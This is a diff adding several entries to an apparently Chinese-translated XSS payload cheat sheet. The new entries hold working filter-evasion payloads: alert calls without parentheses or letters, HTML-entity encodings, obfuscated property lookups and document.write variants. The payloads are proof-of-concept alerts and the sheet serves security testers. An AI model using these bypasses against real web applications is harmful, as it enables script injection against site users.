@@ -240,10 +240,48 @@ $ curl -H "Vulnerable_Header: <XSS>" TARGET/?dummy_string
 %2522%253E%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
 ```
 **39.Alert without Parentheses (Strings Only) (没有括号的弹窗（仅字符串）)** <br>
-当web应用不允许使用括号并且常规的alert可以使用时，可在HTML向量或javascript注入payload进行使用。
+当web应用不允许使用括号并且常规的alert可以使用时，可在HTML向量或javascript注入payload进行使用。 <br>
 ```
 alert`1`
 ```
+**40.Alert without Parentheses (不带括号的弹窗)** <br>
+当web应用不允许使用括号并且PoC需要返回任意目标信息时，可在HTML标签或javascript注入该payload中使用。 <br>
+```
+setTimeout`alert\x28document.domain\x29`
+setInterval`alert\x28document.domain\x29`
+```
+**41.Alert without Parentheses – HTML Entities (不带括号的弹窗– HTML实体)** <br>
+当前的payload只能在HTML代码注入中使用，当web应用不允许使用括号时。 在URL中将"＆"替换为"％26"，将"＃"替换为"％23"。 <br>
+```
+<svg onload=alert&lpar;1&rpar;>
+<svg onload=alert&#40;1&#41>
+```
+**42.Alert without Alphabetic Chars (不带字母字符的弹窗)** <br>
+当前web应用不允许使用字母字符时使用该payload。以下是`alert(1)`的payload <br>
+```
+[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']
+('\141\154\145\162\164\50\61\51')()
+```
+**43.Alert Obfuscation (弹窗混淆)** <br>
+以下payload用于欺骗基于正则表达式（regex）的过滤器。 可以将其与以前的绕过方法结合使用。 根据上下文，最短的选项"top"也可以替换为"window"，"parent"，"self"或者"this" <br>
+```
+(alert)(1)
+a=alert,a(1)
+[1].find(alert)
+top["al"+"ert"](1)
+top[/al/.source+/ert/.source](1)
+al\u0065rt(1)
+top['al\145rt'](1)
+top[8680439..toString(30)](1)
+```
+**44.Alert Alternative – Write & Writeln (弹窗代替方案-Write & Writeln)** <br>
+以下payload用作弹窗函数:alert，prompt,confirm的替代方法。 如果在HTML标签块中则可以直接使用，但如果是javascript注入，则需要完整的"document.write"形式。 URL中将"＆"替换为"％26"，将"＃"替换为"％23"。 可以用writeln代替Write。
+```
+write`XSSed!`
+write`<img/src/o&#78error=alert&lpar;1)&gt;`
+write('\74img/src/o\156error\75alert\501\51\76')
+```
+
 
 ## 致谢
 **英文议题作者：** <br>
